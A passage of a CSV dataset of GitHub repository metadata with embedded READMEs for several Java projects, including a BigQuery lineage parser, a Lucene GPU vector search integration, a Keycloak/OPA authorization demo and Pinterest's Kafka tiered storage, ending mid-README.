repo,branch,readme,releases_count,open_issues_count,branches_count,license,pulls_count,words,readme_mcw,readme_example_count,readme_sample_count,readme_demonstration_count,headings,readme_hcount,mcw,readme_snippets_count,junit_tests,maven_projects_count,maven_plugins,maven_wars_count,maven_jars_count,maven_poms_count,readme_len,readme_avg_slen,readme_avg_wlen,readme_links,readme_links_count
ENATION-UK/page-builder,main,"# image to code

## Introduction
PageBuilder can generate Html pages with the help of AI
- Text to page: Analyzes customer requirements based on the demand text and generates pages.
- Image to page: Converts images into pages.
It uses GPT-4 Vision to generate code.
## Demo

![demo](demo.mp4.gif)

## Usage
### Online Experience

[http://image2code.itbuilder.cn:7008/text2page](http://image2code.itbuilder.cn:7008/text2page)

### Run Locally
```shell
mvn install
java -jar target/page-builder-1.0.0.jar
```
Visit
```
http://localhost:8080/text2page
```
### Set up OpenAI API key

![setting.png](setting.png)

Click settings to configure the OpenAI API key.
 **The API key needs to have access to GPT-4** 

### Upload Image
![upload.png](upload.png)
After uploading the image, GPT's Vision will recognize the image and generate code.",1,0,1,apache-2.0,0.0,"['image', 'code', 'introduction', 'pagebuilder', 'generate', 'html', 'page', 'help', 'ai', 'text', 'page', 'analyzes', 'customer', 'requirement', 'based', 'demand', 'text', 'generates', 'page', 'image', 'page', 'convert', 'image', 'page', 'us', 'vision', 'generate', 'code', 'demo', 'usage', 'online', 'experience', 'http', 'run', 'locally', 'visit', 'set', 'openai', 'api', 'key', 'click', 'setting', 'configure', 'openai', 'api', 'key', 'api', 'key', 'need', 'access', 'upload', 'image', 'uploading', 'image', 'gpt', 'vision', 'recognize', 'image', 'generate', 'code']","['image', 'page', 'code', 'generate', 'api']",0,0,0,"['image', 'code', 'introduction', 'demo', 'usage', 'online', 'experience', 'run', 'locally', 'set', 'openai', 'api', 'key', 'upload', 'image']",8,"['image', 'code', 'introduction', 'demo', 'usage']",2,2.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,832,16.125,4.75968992248062,['http://image2code.itbuilder.cn:7008/text2page -> http://image2code.itbuilder.cn:7008/text2page'],1
borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.
",0,1,1,mit,0.0,"['tool', 'column', 'level', 'lineage', 'parser', 'bigquery', 'using', 'zetasql', 'parser', 'started', 'fork', 'project', 'google', 'heavily', 'modified', 'cover', 'whole', 'bigquery', 'syntax', 'offered', 'zetasql', 'output', 'parser', 'dag', 'column', 'used', 'query', 'source', 'output', 'including', 'auxiliary', 'field', 'could', 'used', 'part', 'filter', 'operation', 'result', 'materialisation', 'field', 'arbitrary', 'bigquery', 'query', 'get', 'following', 'output', 'column', 'part', 'output', 'query', 'input', 'column', 'reference', 'needed', 'produce', 'list', 'join', 'used', 'query', 'considering', 'column', 'used', 'join', 'list', 'column', 'used', 'aggregation', 'list', 'column', 'used', 'filtering', 'column', 'used', 'across', 'query', 'like', 'order', 'list', 'table', 'selected', 'query', 'type', 'sql', 'statement', 'parser', 'schema', 'aware', 'mean', 'query', 'like', 'generate', 'dag', 'output', 'column', 'single', 'node', 'symbol', 'prune', 'unused', 'column', 'mean', 'query', 'like', 'output', 'dag', 'contain', 'column', 'whole', 'input', 'table', 'cover', 'pretty', 'much', 'bigquery', 'syntax', 'including', 'cte', 'clause', 'subqueries', 'analytical', 'function', 'etc', 'map', 'alias', 'original', 'column', 'function', 'access', 'used', 'function', 'access', 'literal', 'used', 'query', 'example', 'clause', 'access', 'field', 'part', 'output', 'column', 'table', 'field', 'used', 'clause', 'transformation', 'temporary', 'function', 'usage', 'parameter', 'param', 'recursive', 'ctes', 'parses', 'statement', 'automatically', 'infers', 'internal', 'bq', 'field', 'like', 'ca', 'parser', 'wo', 'work', 'procedural', 'sql', 'example', 'fail', 'trying', 'parse', 'declare', 'set', 'operation', 'parser', 'wo', 'read', 'logic', 'within', 'udf', 'function', 'check', 'input', 'output', 'zetasql', 'might', 'latest', 'bigquery', 'feature', 'something', 'super', 'new', 'involve', 'either', 'waiting', 'zetasql', 'updated', 'going', 'deep', 'zetasql', 'build', 'feature', 'work', 'trying', 'parse', 'query', 'accessing', 'table', 'guess', 'could', 'bypass', 'using', 'different', 'type', 'access', 'never', 'deeply', 'parser', 'wo', 'build', 'dag', 'multiple', 'query', 'parses', 'single', 'query', 'time', 'build', 'full', 'dag', 'dbt', 'project', 'example', 'use', 'library', 'like', 'connect', 'edge', 'output', 'parser', 'parse', 'sql', 'syntax', 'supported', 'zetasql', 'example', 'operator', 'snowflake', 'join', 'output', 'parser', 'would', 'act', 'column', 'selected', 'could', 'subject', 'interpretation', 'column', 'input', 'marked', 'used', 'output', 'empty', 'list', 'query', 'care', 'specific', 'column', 'number', 'column', 'unexpected', 'bug', 'even', 'though', 'parser', 'texted', 'sql', 'query', 'still', 'might', 'edge', 'case', 'suddenly', 'covered', 'sql', 'hard', 'work', 'table', 'value', 'function', 'although', 'zetasql', 'parses', 'output', 'wo', 'show', 'column', 'tvf', 'automatically', 'infer', 'udfs', 'defined', 'part', 'script', 'going', 'parsed', 'use', 'folder', 'multiple', 'example', 'use', 'parser', 'main', 'caveat', 'relies', 'build', 'catalog', 'zetasql', 'need', 'depending', 'much', 'want', 'parser', 'automate', 'whole', 'process', 'three', 'different', 'method', 'build', 'catalog', 'let', 'parser', 'build', 'catalog', 'show', 'rely', 'metadata', 'bigquery', 'build', 'catalog', 'use', 'method', 'user', 'authenticated', 'gcloud', 'note', 'zero', 'data', 'operation', 'access', 'done', 'directly', 'metadata', 'table', 'table', 'used', 'parsed', 'query', 'parser', 'wo', 'scan', 'whole', 'database', 'access', 'done', 'using', 'bigquery', 'api', 'use', 'authenticate', 'show', 'use', 'local', 'json', 'file', 'build', 'schema', 'example', 'file', 'exact', 'copy', 'metadata', 'information', 'get', 'api', 'note', 'basically', 'automate', 'previous', 'method', 'show', 'example', 'manually', 'create', 'catalog', 'using', 'zetasql', 'feed', 'parser', 'example', 'following', 'example', 'us', 'first', 'method', 'build', 'catalog', 'use', 'bigquery', 'api', 'request', 'metadata', 'table', 'used', 'query', 'output', 'note', 'parser', 'never', 'access', 'data', 'table', 'bigquery', 'instance', 'connection', 'needed', 'metadata', 'table', 'parser', 'use', 'default', 'missing', 'reference', 'table', 'project', 'please', 'refer', 'case', 'need', 'set', 'specific', 'project', 'using', 'udfs', 'also', 'defined', 'within', 'code', 'parser', 'wo', 'able', 'resolve', 'defined', 'code', 'please', 'refer']","['column', 'parser', 'query', 'output', 'used']",13,5,0,"['what', 'parser', 'do', 'what', 'ca', 'do', 'how', 'use', 'example', 'note']",6,"['what', 'do', 'parser', 'ca', 'how']",2,37.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,7851,23.058823529411764,4.885204081632653,"['project by google -> https://github.com/GoogleCloudPlatform/bigquery-data-lineage', 'through the API -> https://cloud.google.com/bigquery/docs/reference/rest/v2/tables']",2
SearchScale/lucene-cuvs,main,"# Lucene CuVS Integration

This is an integration for [CuVS](https://github.com/rapidsai/cuvs), GPU accelerated vector search library from NVIDIA (formerly part of [Raft](https://github.com/rapidsai/raft)), into [Apache Lucene](https://github.com/apache/lucene).

## Architecture

As an initial integration, the CuVS library is plugged in as a new KnnVectorFormat via a custom codec.

![Architecture](lucene-cuvs-architecture.png ""Lucene CuVS Architecture"")

By way of a working example, Wikipedia corpus (1.3M documents) can be indexed, each document having a content vector. Queries (questions.vec.txt) can be executed after the indexing.

> :warning: This is not production ready yet.

## Running

Install NVIDIA drivers, CUDA 12.3+, Maven 3.9.6+ and JDK 21.

    # 1.3 Million wikipedia documents with vector embeddings, along with some query embeddings
    wget -c https://accounts.searchscale.com/wikipedia_vector_dump.csv.gz
    wget -c https://accounts.searchscale.com/questions.vec.txt
    wget -c https://accounts.searchscale.com/questions.raw.txt

    mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=cuvs-searcher-cuda-0.1.jar
    mvn package

    java -cp lucene/target/cuvs-searcher-lucene-0.0.1-SNAPSHOT.jar:cuvs-searcher-cuda-0.1.jar com.searchscale.lucene.vectorsearch.benchmarks.LuceneVectorSearchExample <dump_file> <vector_column_number> <vector_column_name> <number_of_documents_to_index> <vector_dimension> <query_file> <commit_at_number_of_documents> <topK> <no. of HNSW indexing threads> <no. of cuvs indexing threads> <merge_strategy options: NO_MERGE | TRIVIAL_MERGE | NON_TRIVIAL_MERGE> <queryThreads> <hnswMaxConn> <hnswBeamWidth> <hnswVisitedLimit> <cagraIntermediateGraphDegree> <cagraGraphDegree> <cagraITopK> <cagraSearchWidth>

    Example:
    java -Xmx32G -cp lucene/target/cuvs-searcher-lucene-0.0.1-SNAPSHOT.jar:cuvs-searcher-cuda-0.1.jar com.searchscale.lucene.vectorsearch.benchmarks.LuceneVectorSearchExample wikipedia_vector_dump.csv.gz 3 article_vector 12000000 768 query.txt 300000 10 32 32 NO_MERGE 1 16 100 10 128 64 5 1

    (Outputs will be available in benchmarks-results.json and neighbors.csv)

## Contributors

* Vivek Narang, SearchScale
* Ishan Chattopadhyaya, SearchScale & Committer, Apache Lucene & Solr
* Corey Nolet, NVIDIA
* Puneet Ahuja, SearchScale
* Kishore Angani, SearchScale
* Noble Paul, SearchScale & Committer, Apache Lucene & Solr
",0,0,5,apache-2.0,7.0,"['lucene', 'cuvs', 'integration', 'integration', 'cuvs', 'gpu', 'accelerated', 'vector', 'search', 'library', 'nvidia', 'formerly', 'part', 'raft', 'apache', 'lucene', 'architecture', 'initial', 'integration', 'cuvs', 'library', 'plugged', 'new', 'knnvectorformat', 'via', 'custom', 'codec', 'way', 'working', 'example', 'wikipedia', 'corpus', 'document', 'indexed', 'document', 'content', 'vector', 'query', 'executed', 'indexing', 'warning', 'production', 'ready', 'yet', 'running', 'install', 'nvidia', 'driver', 'cuda', 'maven', 'jdk', 'contributor', 'vivek', 'narang', 'searchscale', 'ishan', 'chattopadhyaya', 'searchscale', 'committer', 'apache', 'lucene', 'solr', 'corey', 'nolet', 'nvidia', 'puneet', 'ahuja', 'searchscale', 'kishore', 'angani', 'searchscale', 'noble', 'paul', 'searchscale', 'committer', 'apache', 'lucene', 'solr']","['searchscale', 'lucene', 'cuvs', 'integration', 'nvidia']",4,0,0,"['lucene', 'cuvs', 'integration', 'architecture', 'run', 'million', 'wikipedia', 'document', 'vector', 'embeddings', 'along', 'query', 'embeddings', 'contributor']",5,"['embeddings', 'lucene', 'cuvs', 'integration', 'architecture']",0,0.0,3.0,"[com.googlecode.cmake-maven-project:cmake-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:build-helper-maven-plugin]",0.0,2.0,1.0,2427,31.9,5.968652037617555,"['CuVS -> https://github.com/rapidsai/cuvs', 'Raft -> https://github.com/rapidsai/raft', 'Apache Lucene -> https://github.com/apache/lucene']",3
thomasdarimont/keycloak-opa-authz-demo,main,"Keycloak Open Policy Integration Demo
----

Example code for integrating Open Policy Agent with Keycloak presented at Keycloak Dev Day 2024.

[Slides](keycloak-devday-2024-flexible-authz-for-keycloak-with-openpolicyagent.pdf)

# Build

```
mvn clean package -DskipTests
```

# Run

## Run with HTTP

Start the docker compose setup with Keycloak, Open Policy Agent, Mail server.

```
docker compose -f dev/docker-compose.yml up
```

## Run with HTTPS

This example uses https://id.kubecon.test:8443/auth as the Keycloak auth server URL.

To use the example with https just add a mapping for `id.kubecon.test` to your `/etc/hosts` file
and regenerate the certificates via the [mkcert](https://github.com/FiloSottile/mkcert) tool first.

Then start the `dev/docker-compose-https.yml` docker compose file.

´´´
(cd dev/config/certs && mkcert -install && mkcert -cert-file kubecon.pem -key-file kubecon-key.pem ""*.kubecon.test"")

docker compose -f dev/docker-compose-https.yml up
´´´

# Demo

Once up, you can access Keycloak via http://localhost:8080/auth and login with `admin/admin`.

The demo contains a realm called `opademo` that is configured via `dev/config/realms/opademo.yaml`
through [keycloak-config-cli](https://github.com/adorsys/keycloak-config-cli).

## Users

The example contains a few users to demonstrate various aspects.

- Username: ""tester"" with Password: ""test""
- Username: ""admin"" with Password: ""test""
- Username: ""guest"" with Password: ""test""

## Clients

The `opademo` realm contains a few client applications to demonstrate various access policies expressed
with the REGO Policy language provided by OpenPolicyAgent. 

## OPA Access Policy

The client access policies are defined in the file `dev/opa/policies/keycloak/realms/opademo/access/policy.rego`. 
For this demo Open Policy Agent is configured to watch the file for changes and will automatically
update the policies on change.

To enable the policy check, go to `opademo Realm` -> `Authentication` -> `Required Actions` -> `Enable: OPA Policy Check`.

## Realm configuration

The realm with the clients, roles, groups and users are defined in the `dev/config/realms/opademo.yaml` 
config file. 

For the demo the `tester` user can be granted more access incrementally by uncommenting the role / group memeber ship mapping in the `opademo.yaml` file.

To apply the changed realm configuration to the running Keycloak instance, just execute the following command:

`docker restart dev-keycloak-provisioning-1`.",0,0,1,apache-2.0,1.0,"['keycloak', 'open', 'policy', 'integration', 'demo', 'example', 'code', 'integrating', 'open', 'policy', 'agent', 'keycloak', 'presented', 'keycloak', 'dev', 'day', 'slide', 'build', 'run', 'run', 'http', 'start', 'docker', 'compose', 'setup', 'keycloak', 'open', 'policy', 'agent', 'mail', 'server', 'run', 'http', 'example', 'us', 'http', 'keycloak', 'auth', 'server', 'url', 'use', 'example', 'http', 'add', 'mapping', 'file', 'regenerate', 'certificate', 'via', 'mkcert', 'tool', 'first', 'start', 'docker', 'compose', 'file', 'cd', 'mkcert', 'mkcert', 'docker', 'compose', 'demo', 'access', 'keycloak', 'via', 'http', 'login', 'demo', 'contains', 'realm', 'called', 'configured', 'via', 'user', 'example', 'contains', 'user', 'demonstrate', 'various', 'aspect', 'username', 'tester', 'password', 'test', 'username', 'admin', 'password', 'test', 'username', 'guest', 'password', 'test', 'client', 'realm', 'contains', 'client', 'application', 'demonstrate', 'various', 'access', 'policy', 'expressed', 'rego', 'policy', 'language', 'provided', 'openpolicyagent', 'opa', 'access', 'policy', 'client', 'access', 'policy', 'defined', 'file', 'demo', 'open', 'policy', 'agent', 'configured', 'watch', 'file', 'change', 'automatically', 'update', 'policy', 'change', 'enable', 'policy', 'check', 'go', 'realm', 'configuration', 'realm', 'client', 'role', 'group', 'user', 'defined', 'config', 'file', 'demo', 'user', 'granted', 'access', 'incrementally', 'uncommenting', 'role', 'group', 'memeber', 'ship', 'mapping', 'file', 'apply', 'changed', 'realm', 'configuration', 'running', 'keycloak', 'instance', 'execute', 'following', 'command']","['policy', 'keycloak', 'file', 'demo', 'http']",4,0,0,"['build', 'run', 'run', 'http', 'run', 'http', 'demo', 'user', 'client', 'opa', 'access', 'policy', 'realm', 'configuration']",9,"['run', 'http', 'build', 'demo', 'user']",2,0.0,1.0,[],0.0,1.0,0.0,2491,24.666666666666668,5.1567567567567565,"['mkcert -> https://github.com/FiloSottile/mkcert', 'keycloak-config-cli -> https://github.com/adorsys/keycloak-config-cli']",2
linux-china/sieve-cache,main,"SIEVE Cache in Java
===================

SIEVE is simpler than LRU with following features:

* Simplicity: easy to implement and can be easily integrated into existing systems.
* Efficiency: achieves state-of-the-art efficiency on skewed workloads.
* Cache Primitive: facilitates the design of advanced eviction algorithms.

![How it works](how-it-works.png)

# Get started
 
* Add dependency to `pom.xml`:

```xml
<dependency>
    <groupId>org.mvnsearch</groupId>
    <artifactId>sieve-cache</artifactId>
    <version>0.1.0</version>
</dependency>
```
* Create a cache instance and use it:

```
   Cache<String> cache = new SieveCache<>();
   cache.put(""nick"", ""Jackie"");
   System.out.println(cache.get(""nick""));
```

# References
        
* SIEVE: https://cachemon.github.io/SIEVE-website/
* SIEVE is simpler than LRU: https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/",1,1,1,apache-2.0,0.0,"['sieve', 'cache', 'java', 'sieve', 'simpler', 'lru', 'following', 'feature', 'simplicity', 'easy', 'implement', 'easily', 'integrated', 'existing', 'system', 'efficiency', 'achieves', 'efficiency', 'skewed', 'workload', 'cache', 'primitive', 'facilitates', 'design', 'advanced', 'eviction', 'algorithm', 'get', 'started', 'add', 'dependency', 'create', 'cache', 'instance', 'use', 'references', 'sieve', 'http', 'sieve', 'simpler', 'lru', 'http']","['sieve', 'cache', 'simpler', 'lru', 'efficiency']",0,0,0,"['get', 'start', 'reference']",2,"['get', 'start', 'reference']",2,3.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,905,24.6,5.154471544715447,[],0
Hejow/easy-restdocs-generator,main,"# Easy Spring Rest-docs Generator

[![Maven Central](https://img.shields.io/maven-central/v/io.github.hejow/easy-restdocs-generator.svg)](https://central.sonatype.com/artifact/io.github.hejow/easy-restdocs-generator)
[![GitHub license](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/Hejow/easy-restdocs-generator/blob/main/LICENSE)

### This is a generator that suggest easier way to use rest-docs.

## Install

- `JDK 17` or higher is required
- `Spring Boot 3.X` is required

### Gradle

```groovy
testImplementation(""io.github.hejow:easy-restdocs-generator:1.0.0"")
```

### Maven

```xml

<dependency>
    <groupId>io.github.hejow</groupId>
    <artifactId>easy-restdocs-generator</artifactId>
    <version>1.0.0</version>
    <scope>test</scope>
</dependency>
```

## How to use

Only you have to do is **Customize tags** and **Use builder**.

### Customize tags

To specify your api, easy-restdoc use `ApiTag` to generate documents.

```java
// example
public enum MyTag implements ApiTag {
  USER(""user api"");

  private final String content;

  // ... constructor

  @Override
  public String getName() {
    return this.content;
  }
}
```

### Use builder

After test with `mockMvc` just use builder to generate as like below.

Planning to support `RestAssured`.

> ### 💡 Tips
>
> To generate documents you MUST put `tag`, `result` on `Builder`.
>
> If you don’t put `identifier` on `Builder`, Method name of the test you wrote will be used as `identifier`
>
> Tests MUST run with rest-docs settings such as
`@ExtendWith(RestDocumentationExtension.class)` ([see here](https://github.com/Hejow/easy-restdocs-generator/blob/f25657a5aa20f813d9814d00b661bf6e11d300dd/sample/src/test/java/com/simplerestdocs/user/UserControllerTest.java#L45))

```java
// example
@Test
void myTest() throws Exception {
  // given

  // when
  var result = mockMvc.perform(...);

  // then
  result.andExpectAll(
    status().isOk(),
    ...
  );

  // docs
  result.andDo(
    Document.builder()
      .identifier(""identifier of your API"") // Can skip
      .tag(MyTag.USER) // Custom tags
      .summary(""this will be name of API"")
      .description(""write description about your API"")
      .result(result) // Test result
      .buildAndGenerate()
  );
}
```
",4,0,2,apache-2.0,1.0,"['easy', 'spring', 'generator', 'generator', 'suggest', 'easier', 'way', 'use', 'install', 'higher', 'required', 'required', 'gradle', 'maven', 'use', 'customize', 'tag', 'use', 'builder', 'customize', 'tag', 'specify', 'api', 'use', 'generate', 'document', 'use', 'builder', 'test', 'use', 'builder', 'generate', 'like', 'planning', 'support', 'tip', 'generate', 'document', 'must', 'put', 'put', 'method', 'name', 'test', 'wrote', 'used', 'test', 'must', 'run', 'setting', 'see']","['use', 'builder', 'generate', 'test', 'generator']",2,1,0,"['easy', 'spring', 'generator', 'this', 'generator', 'suggest', 'easy', 'way', 'use', 'install', 'gradle', 'maven', 'how', 'use', 'customize', 'tag', 'use', 'builder', 'tip']",9,"['use', 'easy', 'generator', 'spring', 'this']",4,3.0,1.0,[],0.0,1.0,0.0,2281,33.111111111111114,5.315436241610739,"['![Maven Central -> https://img.shields.io/maven-central/v/io.github.hejow/easy-restdocs-generator.svg', '![GitHub license -> https://img.shields.io/badge/License-Apache%202.0-blue.svg', 'see here -> https://github.com/Hejow/easy-restdocs-generator/blob/f25657a5aa20f813d9814d00b661bf6e11d300dd/sample/src/test/java/com/simplerestdocs/user/UserControllerTest.java#L45']",3
pinterest/tiered-storage,main,"# Pinterest Tiered Storage for Apache Kafka®
Pinterest Tiered Storage for [Apache Kafka®](https://kafka.apache.org/) is a broker-independent framework that allows brokers
to offload finalized log segments to a remote storage system. 
This allows Apache Kafka® to maintain a smaller disk footprint and reduce the need for expensive storage on the brokers. 
The framework also provides a consumer client that can consume from both the broker and the remote storage system.

Pinterest's implementation of Tiered Storage for Apache Kafka® provides a ***broker-independent*** approach to Tiered Storage.
***See the differences between [Pinterest vs. Apache Kafka® Tiered Storage](#pinterest-vs-apache-kafka-tiered-storage)***.

It consists of two main components:
1. [Uploader](ts-segment-uploader): A continuous process that runs on each Apache Kafka® broker and uploads finalized log segments to a remote storage system (e.g. Amazon S3, with unique prefix per cluster and topic).
2. [Consumer](ts-consumer): A consumer client capable of consuming from both Tiered Storage log segments and Apache Kafka® cluster.

A third module [ts-common](ts-common) contains common classes and interfaces that are used by the `ts-consumer` and `ts-segment-uploader` modules, such as Metrics, StorageEndpointProvider, etc.

Feel free to read into each module's README for more details.

# Why Tiered Storage?
[Apache Kafka®](https://kafka.apache.org/) is a distributed event streaming platform that stores partitioned and replicated log segments on disk for
a configurable retention period. However, as data volume and/or retention periods grow, the disk footprint of Apache Kafka® clusters can become expensive. 
Tiered Storage allows brokers to offload finalized log segments to a more cost-effective remote storage system, reducing the need for expensive storage on the brokers.

With Tiered Storage, you can:
1. Maintain a smaller overall broker footprint, reducing operational costs
2. Retain data for longer periods of time while avoiding horizontal and vertical scaling of Apache Kafka® clusters
3. Reduce CPU, network, and disk I/O utilization on brokers by reading directly from remote storage

## Pinterest vs. Apache Kafka® Tiered Storage
### Apache Kafka® Tiered Storage
[KIP-405](https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage?uclick_id=11f222c6-967b-4935-98a9-cc88aafad7f5)
provides a native, open-source offering to Tiered Storage for Apache Kafka® and is available starting from Apache Kafka® 3.6.0.
The native Tiered Storage implementation is broker-dependent, meaning that the broker process itself is responsible 
for offloading finalized log segments to remote storage, and the ***broker is always in the critical path of consumption***.

### Pinterest Tiered Storage: Skip the broker
***Pinterest's implementation of Tiered Storage is broker-independent***, meaning that the Tiered Storage process runs as a separate process alongside the Apache Kafka® server process,
***and the broker is not always in the critical path of consumption***.
This allows for more flexibility in adopting Tiered Storage, and better accommodates unpredictable consumption patterns. 
Some of the key advantages of a broker-independent approach are:

1. **You don't need to upgrade brokers**: While the native offering requires upgrading brokers to a version that supports Tiered Storage, a broker-independent approach does not.
2. **You can skip the broker entirely during consumption**: When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for more
unpredictable spikes in consumption patterns without affecting the broker. See [MemQ](https://github.com/pinterest/memq) for a PubSub system that uses this approach natively.
3. **Support consumer backfills and replays without affecting broker CPU**: When the broker is out of the critical path of consumption,
consumer backfills and replays can be done without needing to keep additional CPU buffer on the brokers just to support those surges.
4. **Avoid cross-AZ transfer costs**: While the native approach adds a cross-AZ network cost factor for consumers that are not AZ-aware,
this broker-independent approach avoids that cost for all consumers when reading directly from remote storage.
5. **Faster adoption, iteration, and improvements**: A broker-independent Tiered Storage solution lets you adopt and upgrade Tiered Storage without
waiting for Apache Kafka® upgrades. Improvements, bug fixes, and new features are released independently of Apache Kafka® releases.

# Highlights
- **Broker Independent**: The tiered storage solution is designed to be broker-independent. [Here's why we think it's better](#pinterest-tiered-storage-for-apache-kafka).
- **Skip the broker entirely during consumption**: The consumer can read from both broker and Tiered Storage backend filesystem. When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for reduction in broker resource utilization.
- **Pluggable Storage Backends**: The framework is designed to be backend-agnostic.
- **S3 Partitioning**: Prefix-entropy (salting) is configurable out-of-the-box to allow for prefix-partitioned S3 buckets, allowing for better scalability by avoiding request rate hotspots.
- **Fault Tolerant**: Broker restarts, replacements, leadership changes, and other common Apache Kafka® operations / issues are handled gracefully.
- **Metrics**: Comprehensive metrics are provided out-of-the-box for monitoring and alerting purposes.

# Quick Start
Detailed quickstart instructions are available [here](docs/quickstart.md).

# Usage
